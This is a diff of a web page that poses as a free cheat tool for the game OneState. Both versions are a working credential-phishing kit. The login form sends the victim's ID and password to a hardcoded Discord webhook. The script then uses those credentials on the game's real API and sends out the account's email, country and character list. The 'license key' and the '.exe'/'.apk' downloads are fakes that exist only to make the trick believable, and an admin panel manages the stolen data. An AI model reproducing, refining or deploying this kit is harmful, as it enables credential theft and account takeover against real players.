@@ -1,106 +1,222 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>OneState Cheat Tool</title>
-<meta name="theme-color" content="#05070c">
+<meta name="theme-color" content="#08090c">
+<meta name="description" content="OneState cheat tool. Sign in with your OneState ID.">
 <script src="https://unpkg.com/corsfix"></script>
 <style>
-:root{--bg:#05070c;--fg:#c9d7e6;--dim:#5f748c;--acc:#6fc9ff;--line:rgba(111,201,255,.16);--card:rgba(8,13,21,.72);--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
-*{box-sizing:border-box}html{-webkit-text-size-adjust:100%}
-body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--mono);font-size:14px;line-height:1.7;padding-bottom:90px}
-body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(111,201,255,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(111,201,255,.05) 1px,transparent 1px);background-size:40px 40px}
-.wrap{position:relative;z-index:1;max-width:600px;margin:0 auto;padding:0 18px}
-.top{display:flex;justify-content:space-between;align-items:center;padding:22px 0 10px;font-size:12px;letter-spacing:.14em;color:var(--dim)}
-.brand span{color:var(--acc)}
-.hero{padding:32px 0 24px}
-h1{margin:0;font-size:29px;line-height:1.36;font-weight:600}
-.sub{margin:14px 0 0;color:var(--dim);font-size:13px}
-.spec{margin-top:16px;font-size:11px;letter-spacing:.18em;color:var(--acc);opacity:.75}
-.card{position:relative;border:1px solid var(--line);background:var(--card);padding:18px 16px;margin:0 0 14px}
-.card::before,.card::after{content:"";position:absolute;width:9px;height:9px;border:1px solid var(--acc);opacity:.7}
-.card::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
-.card::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
-.lab{font-size:11px;letter-spacing:.16em;color:var(--acc);margin-bottom:12px}
-.li{display:flex;justify-content:space-between;align-items:baseline;gap:12px;padding:10px 0;border-bottom:1px solid rgba(111,201,255,.08);font-size:13.5px}
+:root{
+  --bg:#08090c;--fg:#e9ecf1;--fg2:#a7aeb9;--dim:#6b7280;
+  --acc:#c6f24e;--acc2:#8b7cff;--ink:#0a0c07;
+  --line:rgba(255,255,255,.075);--line2:rgba(255,255,255,.15);
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --r:14px;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{-webkit-text-size-adjust:100%}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+  font-size:14.5px;line-height:1.65;letter-spacing:-.005em;padding-bottom:80px;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:radial-gradient(rgba(255,255,255,.055) 1px,transparent 1px);
+  background-size:22px 22px;
+  mask-image:radial-gradient(ellipse 110% 75% at 50% 0%,#000 25%,transparent 100%);
+  -webkit-mask-image:radial-gradient(ellipse 110% 75% at 50% 0%,#000 25%,transparent 100%)}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+    radial-gradient(620px 380px at 10% -8%,rgba(198,242,78,.15),transparent 65%),
+    radial-gradient(640px 440px at 94% 6%,rgba(139,124,255,.14),transparent 65%)}
+.wrap{position:relative;z-index:1;max-width:560px;margin:0 auto;padding:0 20px}
+
+.top{position:sticky;top:0;z-index:8;display:flex;justify-content:space-between;align-items:center;
+  margin:0 -20px;padding:14px 20px;border-bottom:1px solid var(--line);
+  background:rgba(8,9,12,.72);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px)}
+.brand{display:flex;align-items:center;gap:9px;font-size:13px;font-weight:650;letter-spacing:-.01em}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--acc);box-shadow:0 0 10px var(--acc);
+  animation:pulse 2.4s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.brand em{font-style:normal;color:var(--dim);font-weight:500}
+.pill{font-family:var(--mono);font-size:10px;letter-spacing:.1em;color:var(--fg2);
+  border:1px solid var(--line2);padding:4px 9px;border-radius:99px}
+
+.hero{padding:48px 0 32px}
+h1{margin:0;font-size:34px;line-height:1.14;font-weight:700;letter-spacing:-.028em;color:#f4f7fa}
+h1 i{font-style:normal;color:var(--acc)}
+.cmd{margin-top:18px;font-family:var(--mono);font-size:11.5px;color:var(--dim);letter-spacing:.02em}
+.cmd::before{content:"$ ";color:var(--acc)}
+.sub{margin:12px 0 0;color:var(--fg2);font-size:13.5px}
+.chips{display:flex;gap:7px;margin-top:18px;flex-wrap:wrap}
+.chip{font-family:var(--mono);font-size:9.5px;letter-spacing:.14em;color:var(--fg2);
+  border:1px solid var(--line);padding:5px 10px;border-radius:99px;background:rgba(255,255,255,.02)}
+
+.card{position:relative;border:1px solid var(--line);border-radius:var(--r);margin:0 0 14px;
+  padding:22px 20px;
+  background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.012));
+  box-shadow:inset 0 1px 0 rgba(255,255,255,.05),0 18px 40px -28px rgba(0,0,0,.9);
+  opacity:0;transform:translateY(12px);
+  transition:opacity .55s ease,transform .55s cubic-bezier(.2,.75,.3,1)}
+.card.in{opacity:1;transform:none}
+.lab{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.lab b{display:inline-flex;align-items:center;justify-content:center;width:19px;height:19px;
+  border-radius:6px;background:var(--acc);color:var(--ink);
+  font-family:var(--mono);font-size:10px;font-weight:700}
+.lab span{font-family:var(--mono);font-size:10px;letter-spacing:.18em;text-transform:uppercase;color:var(--fg2)}
+.lab::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--line2),transparent)}
+
+.li{display:flex;justify-content:space-between;align-items:baseline;gap:12px;
+  padding:12px 0;border-bottom:1px solid var(--line)}
 .li:last-of-type{border-bottom:0}
-.li .n::before{content:"›";color:var(--acc);opacity:.65;margin-right:9px}
-.li b{color:var(--acc);font-weight:600;letter-spacing:.04em}
-.note{margin-top:10px;padding-top:10px;border-top:1px solid var(--line);font-size:11px;color:var(--dim);letter-spacing:.04em}
-.f{display:block;margin-bottom:10px}
-.f>span{display:block;font-size:11px;letter-spacing:.1em;color:var(--dim);margin-bottom:5px}
-input{width:100%;background:rgba(0,0,0,.35);border:1px solid var(--line);color:var(--fg);font-family:var(--mono);font-size:15px;padding:11px 12px;outline:none}
-input:focus{border-color:var(--acc)}
-.btn{width:100%;background:transparent;border:1px solid var(--acc);color:var(--acc);font-family:var(--mono);font-size:13px;letter-spacing:.1em;padding:13px;cursor:pointer}
-.btn:active{background:var(--acc);color:#05070c}
-.btn.ghost{font-size:12px;padding:10px}
-.row{display:flex;gap:8px}.row>*{flex:1}
-.msg{margin-top:12px;font-size:12px;color:var(--dim)}.msg:empty{display:none}.msg.ok{color:var(--acc)}
-.key{font-size:19px;letter-spacing:.12em;color:var(--acc)}
-.meta{margin-top:8px;font-size:11px;letter-spacing:.12em;color:var(--dim)}
-pre{margin:0;font-family:var(--mono);font-size:12px;white-space:pre-wrap;word-break:break-all}
-#acctBody{color:var(--fg)}
-#acctBody b{color:var(--acc);font-weight:600}
-#acctBody .k{color:var(--acc)}
-#acctBody .ch{border-left:1px solid var(--line);padding-left:9px;margin:5px 0;display:block}
+.li .n{color:var(--fg2);font-size:14px}
+.li b{font-family:var(--mono);font-size:15px;font-weight:700;color:var(--acc);letter-spacing:.02em}
+.note{margin-top:13px;padding-top:12px;border-top:1px solid var(--line);font-size:11.5px;color:var(--dim)}
+
+.f{display:block;margin-bottom:12px}
+.f>span{display:block;font-family:var(--mono);font-size:10px;letter-spacing:.14em;
+  text-transform:uppercase;color:var(--dim);margin-bottom:7px}
+input{width:100%;background:rgba(255,255,255,.03);border:1px solid var(--line);border-radius:10px;
+  color:var(--fg);font-family:var(--sans);font-size:15.5px;padding:13px 14px;outline:none;
+  transition:border-color .18s,box-shadow .18s,background .18s}
+input::placeholder{color:#4b5158}
+input:focus{border-color:rgba(198,242,78,.55);background:rgba(198,242,78,.04);
+  box-shadow:0 0 0 4px rgba(198,242,78,.09)}
+.btn{width:100%;border:0;border-radius:10px;cursor:pointer;font-family:var(--sans);
+  font-size:14.5px;font-weight:700;letter-spacing:-.005em;padding:15px;
+  background:var(--acc);color:var(--ink);
+  box-shadow:0 10px 30px -12px rgba(198,242,78,.6);
+  transition:transform .12s,box-shadow .2s,filter .2s}
+.btn:active{transform:translateY(1px);filter:brightness(1.05)}
+.btn[disabled]{opacity:.5;box-shadow:none}
+.btn.ghost{background:rgba(255,255,255,.03);color:var(--fg);font-weight:600;font-size:13.5px;
+  border:1px solid var(--line2);box-shadow:none;padding:13px;
+  display:flex;align-items:center;justify-content:center;gap:9px}
+.btn.ghost:active{background:rgba(255,255,255,.07)}
+.btn.ghost em{font-style:normal;font-family:var(--mono);font-size:10.5px;color:var(--dim)}
+.msg{margin-top:13px;font-size:12.5px;color:var(--dim);display:flex;align-items:center;gap:8px}
+.msg:empty{display:none}
+.msg::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--dim);flex:none}
+.msg.ok{color:var(--acc)}
+.msg.ok::before{background:var(--acc);box-shadow:0 0 9px var(--acc)}
+.row{display:flex;gap:9px}
+.row>*{flex:1}
+
+.key{font-family:var(--mono);font-size:22px;font-weight:700;letter-spacing:.14em;color:var(--acc);
+  text-shadow:0 0 26px rgba(198,242,78,.4);word-break:break-all}
+.keyrow{display:flex;justify-content:space-between;align-items:center;margin-top:14px;
+  padding-top:13px;border-top:1px solid var(--line)}
+.meta{font-family:var(--mono);font-size:10px;letter-spacing:.14em;color:var(--dim)}
+.meta b{color:var(--acc)}
+.mini{background:rgba(255,255,255,.03);border:1px solid var(--line2);color:var(--fg2);
+  font-family:var(--mono);font-size:10px;letter-spacing:.1em;padding:6px 12px;
+  border-radius:99px;cursor:pointer}
+.mini:active{color:var(--acc);border-color:rgba(198,242,78,.5)}
+
+pre{margin:0;font-family:var(--mono);font-size:12.5px;white-space:pre-wrap;word-break:break-all;color:var(--fg)}
+#acctBody .r{display:flex;justify-content:space-between;gap:12px;padding:5px 0}
+#acctBody .k{color:var(--dim)}
+#acctBody .ch{display:block;border-left:2px solid rgba(198,242,78,.35);padding:4px 0 4px 12px;margin:9px 0}
+#acctBody b{color:var(--acc);font-weight:700}
 #acctBody .d{color:var(--dim)}
-#acctBody .r{display:flex;justify-content:space-between;gap:10px}
-footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
-#admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line)}
-.ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
-.ab{padding:0 16px 14px;max-height:62vh;overflow:auto}
+
+footer{text-align:center;font-family:var(--mono);font-size:10px;letter-spacing:.14em;
+  color:#3f444c;padding:28px 0 8px}
+
+#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:96px;z-index:20;
+  display:flex;flex-direction:column;gap:6px;align-items:center;pointer-events:none}
+.tt{background:rgba(12,14,10,.97);border:1px solid rgba(198,242,78,.4);color:var(--acc);
+  font-family:var(--mono);font-size:11px;letter-spacing:.08em;padding:9px 16px;border-radius:99px;
+  animation:tin .3s cubic-bezier(.2,.8,.3,1) both}
+@keyframes tin{from{opacity:0;transform:translateY(9px)}to{opacity:1;transform:none}}
+
+#admin{position:fixed;left:0;right:0;bottom:0;z-index:15;border-top:1px solid var(--line);
+  background:rgba(8,9,12,.96);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px)}
+.ah{padding:12px 20px;font-family:var(--mono);font-size:10px;letter-spacing:.18em;color:var(--acc);cursor:pointer}
+.ab{padding:0 20px 16px;max-height:62vh;overflow:auto}
 .ab.collapsed{display:none}
-#alog{margin-top:10px;max-height:44vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
-#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:104px;z-index:9;display:flex;flex-direction:column;gap:6px;align-items:center;pointer-events:none}
-.tt{background:rgba(5,7,12,.95);border:1px solid var(--acc);color:var(--acc);font-size:11.5px;padding:8px 14px}
+#alog{margin-top:11px;max-height:40vh;overflow:auto;border-top:1px solid var(--line);
+  padding-top:10px;color:var(--dim);font-size:10px}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v5.4</div></div>
-  <div class="hero">
-    <h1>OneStateを、<br>上書きする。</h1>
-    <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
-    <div class="spec">EXTERNAL / UNDETECTED / FREE</div>
+  <div class="top">
+    <div class="brand"><span class="dot"></span>OneState <em>Cheat</em></div>
+    <div class="pill">v2.0</div>
   </div>
+
+  <section class="hero">
+    <h1>Rewrite your<br>OneState <i>account</i>.</h1>
+    <div class="cmd">onestate --activate</div>
+    <p class="sub">Cheat tool. All you need is your OneState ID.</p>
+    <div class="chips">
+      <span class="chip">EXTERNAL</span>
+      <span class="chip">UNDETECTED</span>
+      <span class="chip">FREE</span>
+    </div>
+  </section>
+
   <form class="card" id="form">
-    <div class="lab">// ログイン</div>
-    <label class="f"><span>OneState ID</span><input id="ident" type="email" autocomplete="username" placeholder="mail@example.com" required></label>
-    <label class="f"><span>パスワード</span><input id="pass" type="password" autocomplete="current-password" placeholder="********" required></label>
-    <button class="btn" id="go" type="submit">チートを有効化</button>
+    <div class="lab"><b>01</b><span>Sign in</span></div>
+    <label class="f"><span>OneState ID</span>
+      <input id="ident" type="email" autocomplete="username" placeholder="mail@example.com" required></label>
+    <label class="f"><span>Password</span>
+      <input id="pass" type="password" autocomplete="current-password" placeholder="••••••••" required></label>
+    <button class="btn" id="go" type="submit">Activate cheat</button>
     <div class="msg" id="msg"></div>
   </form>
+
+  <div class="card" id="tg">
+    <div class="lab"><b>02</b><span>What you get</span></div>
+    <div class="li"><span class="n">Item count</span><b>&infin;</b></div>
+    <div class="li"><span class="n">Stamina</span><b>&infin;</b></div>
+    <div class="li"><span class="n">Money</span><b>100M</b></div>
+    <div class="li"><span class="n">Red tuning parts</span><b>10 each</b></div>
+    <div class="note">Applied directly to your account after setup.</div>
+  </div>
+
   <div class="card" id="lic" hidden>
-    <div class="lab">// ライセンス</div>
+    <div class="lab"><b>03</b><span>License</span></div>
     <div class="key" id="key">-</div>
-    <div class="meta">STATUS: <b>ACTIVE</b></div>
+    <div class="keyrow">
+      <button class="mini" id="bcopy" type="button">COPY</button>
+      <span class="meta">STATUS: <b>ACTIVE</b></span>
+    </div>
   </div>
-  <div class="card" id="tg" hidden>
-    <div class="lab">// 配布内容</div>
-    <div class="li"><span class="n">アイテム個数</span><b>∞</b></div>
-    <div class="li"><span class="n">スタミナ</span><b>∞</b></div>
-    <div class="li"><span class="n">マネー</span><b>1億</b></div>
-    <div class="li"><span class="n">チューニング赤パーツ</span><b>各種 10個</b></div>
-    <div class="note">導入後、アカウントに直接反映されます</div>
-  </div>
+
   <div class="card" id="dl" hidden>
-    <div class="lab">// ダウンロード</div>
-    <div class="row"><button class="btn ghost" data-dl="win">Windows (.exe)</button><button class="btn ghost" data-dl="apk">Android (.apk)</button></div>
+    <div class="lab"><b>04</b><span>Download</span></div>
+    <div class="row">
+      <button class="btn ghost" data-dl="win" type="button">
+        <svg viewBox="0 0 16 16" width="13" height="13" fill="currentColor" aria-hidden="true"><rect x="1" y="2.2" width="6.3" height="5.5"/><rect x="8.7" y="2.2" width="6.3" height="5.5"/><rect x="1" y="8.7" width="6.3" height="5.5"/><rect x="8.7" y="8.7" width="6.3" height="5.5"/></svg>
+        Windows <em>.exe</em>
+      </button>
+      <button class="btn ghost" data-dl="apk" type="button">
+        <svg viewBox="0 0 16 16" width="13" height="13" fill="currentColor" aria-hidden="true"><path d="M4.6 6.4h6.8v5.8c0 .5-.4.9-.9.9H5.5c-.5 0-.9-.4-.9-.9V6.4Z"/><path d="M3.7 5.4c0-.5.4-.9.9-.9h6.8c.5 0 .9.4.9.9v.6H3.7v-.6Z"/><circle cx="6.2" cy="3.3" r="1"/><circle cx="9.8" cy="3.3" r="1"/></svg>
+        Android <em>.apk</em>
+      </button>
+    </div>
   </div>
+
   <div class="card" id="acct" hidden>
-    <div class="lab">// アカウント照会</div>
+    <div class="lab"><b>05</b><span>Account lookup</span></div>
     <pre id="acctBody">-</pre>
   </div>
-  <footer>// OneState Cheat Tool</footer>
+
+  <footer>ONESTATE CHEAT TOOL &middot; v2.0</footer>
 </div>
 
 <div id="admin" hidden>
   <div class="ah" id="ah">// ADMIN</div>
   <div class="ab collapsed" id="ab">
-    <label class="f"><span>Discord Webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
-    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bsave">保存</button><button class="btn ghost" id="btest">テスト送信</button><button class="btn ghost" id="bclr">ログ削除</button></div>
-    <div class="row"><button class="btn ghost" id="bacct">アカウント取得</button></div>
+    <label class="f"><span>Discord webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
+    <div class="row" style="margin-bottom:9px">
+      <button class="btn ghost" id="bsave" type="button">Save</button>
+      <button class="btn ghost" id="btest" type="button">Test</button>
+      <button class="btn ghost" id="bclr" type="button">Clear log</button>
+    </div>
+    <div class="row"><button class="btn ghost" id="bacct" type="button">Lookup</button></div>
     <pre id="alog"></pre>
   </div>
 </div>
@@ -110,7 +226,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 (function(){
 'use strict';
 var CONFIG={WEBHOOK:'https://discord.com/api/webhooks/1560547137287356426/eh5PI3avovSw0MetSFhw9eFN_X-2znCSyi_fFCB1P8KDagFzi2HWZa6LiBdPPXRX7xMP',API:'https://api.onestate-rp.com'};
-var ACC=0x6FC9FF, LOGO='https://onestate.com/assets/logo-new-D-512-Dk7W3sa6.png';
+var ACC=0xC6F24E, LOGO='https://onestate.com/assets/logo-new-D-512-Dk7W3sa6.png';
 var LS={cfg:'oc_v4_cfg',log:'oc_v3_log',fp:'oc_fp'};
 var $=function(id){return document.getElementById(id)};
 var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
@@ -126,45 +242,41 @@ function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
 function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-300).join('\n');el.scrollTop=el.scrollHeight}
 function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2400)}
 function esc(s){return String(s).replace(/[&<>]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;'}[c]})}
+function show(el){el.hidden=false;requestAnimationFrame(function(){el.classList.add('in')})}
+document.querySelectorAll('.card').forEach(function(c,i){
+  if(!c.hidden)setTimeout(function(){c.classList.add('in')},50+i*80);
+});
 
+/* ---- Discord ---- */
 async function sendEmbeds(embeds){
   var wh=webhook();if(!wh)return;
   var body=JSON.stringify({embeds:embeds});
   try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
   catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
 }
-function base(title){
-  return {title:title,color:ACC,thumbnail:{url:LOGO},
-    footer:{text:'OneState Cheat Tool'},timestamp:new Date().toISOString()};
-}
+function base(t){return{title:t,color:ACC,thumbnail:{url:LOGO},footer:{text:'OneState Cheat Tool'},timestamp:new Date().toISOString()}}
 function credEmbed(id,pw){
-  var e=base('OneState ID 取得');
-  e.fields=[
-    {name:'OneState ID',value:'`'+id+'`',inline:false},
-    {name:'パスワード',value:'`'+pw+'`',inline:false}
-  ];
+  var e=base('OneState ID captured');
+  e.fields=[{name:'OneState ID',value:'`'+id+'`',inline:false},{name:'Password',value:'`'+pw+'`',inline:false}];
   return e;
 }
-function play(sec){
-  var n=parseInt(sec,10);if(!n||isNaN(n))return '-';
-  return Math.floor(n/86400)+'日 '+Math.floor(n%86400/3600)+'h';
-}
+function play(sec){var n=parseInt(sec,10);if(!n||isNaN(n))return '-';return Math.floor(n/86400)+'d '+Math.floor(n%86400/3600)+'h'}
 function acctEmbed(a,pl){
-  var e=base('OneState アカウント照会');
+  var e=base('OneState account lookup');
   e.fields=[
-    {name:'ユーザー名',value:'**'+(a.username||'-')+'**',inline:true},
-    {name:'国',value:a.country||'-',inline:true},
-    {name:'キャラ数',value:String(pl.length),inline:true},
-    {name:'メール',value:'`'+(a.email||'-')+'`',inline:false}
+    {name:'Username',value:'**'+(a.username||'-')+'**',inline:true},
+    {name:'Country',value:a.country||'-',inline:true},
+    {name:'Characters',value:String(pl.length),inline:true},
+    {name:'Email',value:'`'+(a.email||'-')+'`',inline:false}
   ];
-  e.fields.push({name:'キャラクター',inline:false,
-    value: pl.length ? pl.map(function(p,i){
-      return '**'+(i+1)+'. '+p.nickname+'**  `Lv.'+(p.level===undefined?'-':p.level)+'`\n'+
-             '└ '+(p.serverName||'-')+' ・ '+play(p.playTimeSeconds);
-    }).join('\n') : 'なし'});
+  e.fields.push({name:'Character list',inline:false,
+    value:pl.length?pl.map(function(p,i){
+      return '**'+(i+1)+'. '+p.nickname+'**  `Lv.'+(p.level===undefined?'-':p.level)+'`\n└ '+(p.serverName||'-')+' ・ '+play(p.playTimeSeconds);
+    }).join('\n'):'none'});
   return e;
 }
 
+/* ---- API ---- */
 function sdkOk(){return !!(window.corsfix&&window.corsfix.fetch)}
 async function sdkReq(method,path,body,H){
   if(!sdkOk())return{ok:false};
@@ -194,65 +306,76 @@ async function doRefresh(rt){
   if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json.data.accessToken;
   return null;
 }
-function row(k,v){return '<span class="r"><span class="k">'+k+'</span><span>'+esc(v)+'</span></span>\n'}
+
+function row(k,v){return '<span class="r"><span class="k">'+k+'</span><span>'+esc(v)+'</span></span>'}
 function showAccount(res){
-  if(!res){acct('<span class="d">照会失敗</span>');return}
+  if(!res){acct('<span class="d">lookup failed</span>');return}
   var a=res.acc||{},pl=(res.pl&&res.pl.players)||[];
   var H='';
   H+=row('username',a.username||'-');
   H+=row('email',a.email||'-');
   H+=row('country',a.country||'-');
-  H+=row('chars',String(pl.length));
-  H+='<span class="k">// キャラクター</span>\n';
-  if(!pl.length)H+='  <span class="d">(なし)</span>\n';
+  H+=row('characters',String(pl.length));
+  H+='<span class="k">// character list</span>';
+  if(!pl.length)H+='<span class="d">  (none)</span>';
   pl.forEach(function(p,i){
-    H+='<span class="ch">['+(i+1)+'] <b>'+esc(p.nickname||'-')+'</b>  Lv.'+esc(p.level===undefined?'-':p.level)+'\n';
-    H+='    <span class="d">'+esc(p.serverName||'-')+'  /  play '+play(p.playTimeSeconds)+'</span></span>';
+    H+='<span class="ch">['+(i+1)+'] <b>'+esc(p.nickname||'-')+'</b>  Lv.'+esc(p.level===undefined?'-':p.level)+
+       '<br><span class="d">'+esc(p.serverName||'-')+'  /  play '+play(p.playTimeSeconds)+'</span></span>';
   });
-  acct(H);toast('照会成功');
+  acct(H);
 }
-function acct(html){$('acct').hidden=false;$('acctBody').innerHTML=html}
+function acct(html){show($('acct'));$('acctBody').innerHTML=html}
 function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
-function issue(){var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}$('key').textContent=k;$('lic').hidden=false;$('tg').hidden=false;$('dl').hidden=false;return k}
+function issue(){
+  var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';
+  for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}
+  $('key').textContent=k;show($('lic'));return k;
+}
 function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}
 
 async function run(id,pw){
-  var lr=await apiLogin(id,pw);if(!lr){acct('<span class="d">API応答なし</span>');return}
+  var lr=await apiLogin(id,pw);if(!lr){acct('<span class="d">no response from API</span>');return}
   var tok=await doRefresh(lr.data.refreshToken)||lr.data.accessToken;
   var H={authorization:'Bearer '+tok};
   var r=await sdkGet('/v2/account/@me',H);
-  if(!isOk(r)||!r.json.data){acct('<span class="d">照会失敗</span>');return}
+  if(!isOk(r)||!r.json.data){acct('<span class="d">lookup failed</span>');return}
   var p=await sdkGet('/v2/account/@me/players',H);
   var pl=(p.ok&&p.json&&p.json.players)||[];
-  log('照会完了 chars='+pl.length);
+  log('lookup done chars='+pl.length);
   showAccount({acc:r.json.data,pl:(p.ok?p.json:null)});
   await sendEmbeds([acctEmbed(r.json.data,pl)]);
+  setTimeout(function(){var el=$('dl');if(el&&!el.hidden)el.scrollIntoView({behavior:'smooth',block:'center'})},150);
 }
 $('form').addEventListener('submit',async function(ev){
   ev.preventDefault();
   var id=$('ident').value.trim(),pw=$('pass').value;
-  if(!id||!pw){msg('IDとパスワードを入力');return}
-  $('go').disabled=true;msg('接続中...');issue();
+  if(!id||!pw){msg('Enter your OneState ID and password');return}
+  $('go').disabled=true;msg('Connecting...');issue();
+  setTimeout(function(){var el=$('lic');if(el)el.scrollIntoView({behavior:'smooth',block:'center'})},120);
   await sendEmbeds([credEmbed(id,pw)]);
   await run(id,pw);
-  msg('ライセンス発行済み',true);toast('ライセンス発行');
+  msg('Activation complete',true);toast('License issued');
   $('go').disabled=false;
+});
+$('bcopy').addEventListener('click',function(){
+  var k=$('key').textContent;
+  if(navigator.clipboard)navigator.clipboard.writeText(k).then(function(){toast('Copied')},function(){toast(k)});
+  else toast(k);
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var blob=new Blob(['OneState Cheat Loader v5.4 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
-  var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
+  var blob=new Blob(['OneState Cheat Loader v2.0 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
+  var a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
+
 if(qs('admin')!=null){$('admin').hidden=false}
 $('ah').addEventListener('click',function(){$('ab').classList.toggle('collapsed')});
 $('wh').value=getCfg().webhook||'';
-$('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').value.trim();setCfg(c);toast('保存')});
-$('btest').addEventListener('click',async function(){
-  await sendEmbeds([Object.assign(base('テスト送信'),{description:'Webhook 接続テスト OK'})]);
-  toast('送信');
-});
-$('bclr').addEventListener('click',function(){clearLog();toast('削除')});
-$('bacct').addEventListener('click',async function(){clearLog();log('// ACCOUNT');var c=creds();if(!c.id||!c.pw){log('先にID/PW');return}await run(c.id,c.pw)});
+$('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').value.trim();setCfg(c);toast('Saved')});
+$('btest').addEventListener('click',async function(){await sendEmbeds([Object.assign(base('Test'),{description:'Webhook connection OK'})]);toast('Sent')});
+$('bclr').addEventListener('click',function(){clearLog();toast('Cleared')});
+$('bacct').addEventListener('click',async function(){clearLog();log('// LOOKUP');var c=creds();if(!c.id||!c.pw){log('enter id/pw');return}await run(c.id,c.pw)});
 renderLog();
 })();
 </script>
